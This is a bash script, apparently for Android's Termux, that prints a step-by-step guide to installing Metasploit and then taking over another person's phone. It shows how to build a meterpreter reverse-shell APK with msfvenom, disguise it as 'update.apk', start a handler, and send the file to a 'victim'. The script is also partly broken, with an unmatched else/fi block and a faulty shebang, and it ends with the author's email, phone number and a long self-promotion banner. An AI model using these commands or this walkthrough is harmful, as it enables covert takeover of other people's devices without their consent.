#!bin/bash
echo -e "\e[1;31m"
figlet ALLTOOL
echo -e "\e[1;34m Created By \e[1;32m"
toilet -f mono12 -F border AKASH 
clear
echo -e "\e[1;32m   STEP 1 (METASPLOIT INSTALLATION NO ROOT)
sleep 2
This script will install Metasploit framework in your termux app so you need some requirements to use Metasploit in termux
sleep 2

> Good internet connection
sleep 2
> 1 Gb of internet
sleep 2
> 2 Gb of storage
sleep 2
> Stable android device version not below then 4.0.0
sleep2 
> Patience
sleep 2
After completing all requirements you can go ahead for the installation of Metasploit in termux.
sleep 2
Now here in script menu select option 1 to install Metasploit framework in termux and after a 30 seconds process will be shown and after that, a version selection menu will have appeared and in that select, you devise version and click on enter in keyboard and wait for at least 1 hour or 1:30 hour it depends on your android device so I recommend you to stay away from the device until the Metasploit installs properly. So take a walk outside till it installs :)
sleep 2
STEP 2 (METASPLOIT CONSOLE OPENING)
sleep 2
After the successful installation Metasploit will automatically be opened in the same session if it doesn't then follow the below step. if you are using (6.0.0) version based device
sleep 2
then exit 
sleep 2
cd metasploit-framework
sleep 2
 ./msfconsole
 sleep 2
 or 
 sleep 2 
 msfconsole
 sleep 2 
 Now from here the Metasploit console will be opened if it doesn't then repair Metasploit from the m-wiz tool it will solve the issue...
 sleep 2 
 STEP 3 (CREATING PAYLOAD AND HACKING TARGET)
 sleep 2 
 Here we need to be connected to the safe wifi in which our target is connected (victim) after that open termux app and open 1st session (new session)
 sleep 2 
 Now, in the 1st session type ipconfig and here search for ip starting with 192.168. something like this after getting that ip now copy it somewhere in note.
 sleep 2 
 Now, open 2nd session and open metasploit directoty
 sleep 2 
 cd $HOME/metasploit-framework
 sleep 2 
ls 
sleep 2 
./msfvenom -p android/meterpreter/reverse_tcp LHOST=(yourip here) LPORT=4444 R > /sdcard/update.apk
sleep 2 
Ex:- ./msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.48.24 LPORT=4444 R > /sdcard/update.apk
sleep 2 
STEP 4 (EXPLOITING LAST STEP)
sleep 2 
Wait until payload get ready ....after that follow this (open 3rd session)
sleep 2 
cd $HOME/metasploit-framework
sleep 2 
./msfconsole
sleep 2 
now open new (4th) session and apply these commands
sleep 2 
pg_ctl -D $PREFIX/var/lib/postgresql start (not that important)
sleep 2 
now come back to (3rd session) in which you opened Metasploit now apply these commands.
sleep 2 
db_status
sleep 2 
use exploit/multi/handler
sleep 2 
set payload android/meterpreter/reverse_tcp
sleep 2 
set lhost (your ip here)
sleep 2 
set lport (the port you given)
sleep 2 
exploit
sleep2 
(now go to your file manager and check for update.apk payload and send it to your victim and when he opens it you will get meterpreter session to hack his device)
sleep 2 
type info \e[0m"
echo -e "\e[1;32m [ PRESS ENTER TO EXIT ] \e[0m"
 read a1 
 clear
sleep 2
      
 echo -e '\033[31;40;1m              AKASH!'
      	cd $HOME/akash-patel
     	    bash video1.sh  

else   
	clear
        echo -e '\033[36;40 ;1m 
============CODDEDBYAKASHHACKER===============         CODDEDBYAKASHHACKER-------------
            CODDEDBYAKASHHACKER             |
            CODDEDBYAKASHHACKER             |
            CODDEDBYAKASHHACKER             |
            CODDEDBYAKASHHACKER             |
            CODDEDBYAKASHHACKER             |
            CODDEDBYAKASHHACKER             |
            CODDEDBYAKASHHACKER             |
            CODDEDBYAKASHHACKER             |
            CODDEDBYAKASHHACKER             |
            CODDEDBYAKASHHACKER             |
            CODDEDBYAKASHHACKER             |
            CODDEDBYAKASHHACKER             |
            CODDEDBYAKASHHACKER             |
            CODDEDBYAKASHHACKER             |
            CODDEDBYAKASHHACKER             |
            CODDEDBYAKASHHACKER             |
            CODDEDBYAKASHHACKER ------------|
            CODDEDBYAKASHHACKER
            CODDEDBYAKASHHACKER
            CODDEDBYAKASHHACKER
            CODDEDBYAKASHHACKER
            CODDEDBYAKASHHACKER
            CODDEDBYAKASHHACKER
            CODDEDBYAKASHHACKER
            CODDEDBYAKASHHACKER
            CODDEDBYAKASHHACKER
            CODDEDBYAKASHHACKER
            CODDEDBYAKASHHACKER
            CODDEDBYAKASHHACKER
            CODDEDBYAKASHHACKER
            CODDEDBYAKASHHACKER
            CODDEDBYAKASHHACKER
            CODDEDBYAKASHHACKER
            CODDEDBYAKASHHACKER
            CODDEDBYAKASHHACKER
            CODDEDBYAKASHHACKER
            CODDEDBYAKASHHACKER
            CODDEDBYAKASHHACKER
            CODDEDBYAKASHHACKER
            CODDEDBYAKASHHACKER
            CODDEDBYAKASHHACKER
            CODDEDBYAKASHHACKER
            CODDEDBYAKASHHACKER
            CODDEDBYAKASHHACKER
            CODDEDBYAKASHHACKER
            CODDEDBYAKASHHACKER
            CODDEDBYAKASHHACKER
            CODDEDBYAKASHHACKER
            CODDEDBYAKASHHACKER
            CODDEDBYAKASHHACKER
            CODDEDBYAKASHHACKER
            CODDEDBYAKASHHACKER....'	
clear
echo -e "\e[1;32m [ PRESS ENTER TO EXIT \e[0m"

clear
echo -e "\e[1;31m"
figlet ALTOOL
echo -e "\e[1;34m Created By \e[1;32m"
toilet -f mono12 -F border AKASH
echo -e "\e[4;34m This Script Was Created By AKASHHACKER\e[0m"
echo -e "\e[1;34m For Any Queries Mail Me!!!\e[0m"
echo -e "\e[1;32m           Mail: ap258187@gmail.com \e[0m"
echo -e "\e[1;32m       Whatsapp: 7079063261........ \e[0m"
echo -e "\e[4;32m   YouTube Page: https://youtube.com/channel/UCi9kS7X5E7knfhbFMrwsb4Q \e[0m"
echo -e "\e[1;32m                100+TOOL 
COMMING SOON	\e[0m"
cd $HOME/akash-patel
        bash video1.sh
fi               